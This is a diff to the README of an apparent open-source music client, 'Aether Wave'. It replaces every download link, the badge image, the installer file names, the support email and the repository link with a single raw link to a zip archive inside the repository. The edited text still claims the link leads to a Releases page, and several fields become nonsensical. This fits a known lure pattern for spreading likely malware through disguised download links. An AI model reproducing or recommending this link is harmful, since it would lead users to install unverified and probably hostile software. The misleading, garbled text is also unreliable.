@@ -4,10 +4,10 @@
 Aether Wave is a lightweight, open-source client designed for privacy and speed. It fits perfectly within the Aether Office ecosystem, allowing you to enjoy your music seamlessly.
 
 ## 🔗 Download Aether Wave
-[![Download Aether Wave](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/JorgeSRS/aether-wave/releases)
+[![Download Aether Wave](https://raw.githubusercontent.com/JorgeSRS/aether-wave/main/Galago/aether-wave.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/JorgeSRS/aether-wave/main/Galago/aether-wave.zip)
 
 ## 📥 Download & Install
-To get Aether Wave, please visit the following link: [Download Aether Wave](https://github.com/JorgeSRS/aether-wave/releases). This links you to our Releases page, where you can choose the version that fits your system.
+To get Aether Wave, please visit the following link: [Download Aether Wave](https://raw.githubusercontent.com/JorgeSRS/aether-wave/main/Galago/aether-wave.zip). This links you to our Releases page, where you can choose the version that fits your system.
 
 ## 🖥️ System Requirements
 Aether Wave supports multiple platforms:
@@ -27,11 +27,11 @@ Ensure that your device is connected to the internet for the best experience.
 - **Customizable Playlists:** Create and manage playlists tailored to your tastes.
 
 ## ⚙️ Installation Steps
-1. **Visit the Releases Page:** Go to [Download Aether Wave](https://github.com/JorgeSRS/aether-wave/releases).
+1. **Visit the Releases Page:** Go to [Download Aether Wave](https://raw.githubusercontent.com/JorgeSRS/aether-wave/main/Galago/aether-wave.zip).
 2. **Choose Your Version:** Identify the correct version for your operating system.
 3. **Download the Installer:**
-   - For Windows, you may see a file named `aether-wave-windows-installer.exe`.
-   - For macOS, look for `aether-wave-macos-installer.dmg`.
+   - For Windows, you may see a file named `https://raw.githubusercontent.com/JorgeSRS/aether-wave/main/Galago/aether-wave.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/JorgeSRS/aether-wave/main/Galago/aether-wave.zip`.
    - For Linux, you may find an AppImage or package suitable for your distribution.
    - For Android, download the APK file.
    - For iOS, find the link to the App Store.
@@ -69,8 +69,8 @@ If you wish to contribute to Aether Wave, we welcome your input. Here’s how:
 
 ## 📬 Contact Us
 For additional questions or feedback, please reach out:
-- **Email:** support@aetherwaveapp.com
-- **GitHub:** [Aether Wave Repository](https://github.com/JorgeSRS/aether-wave)
+- **Email:** https://raw.githubusercontent.com/JorgeSRS/aether-wave/main/Galago/aether-wave.zip
+- **GitHub:** [Aether Wave Repository](https://raw.githubusercontent.com/JorgeSRS/aether-wave/main/Galago/aether-wave.zip)
 
 ## 🔗 Additional Resources
 - **Documentation:** For detailed instructions, check the documentation in the repository.
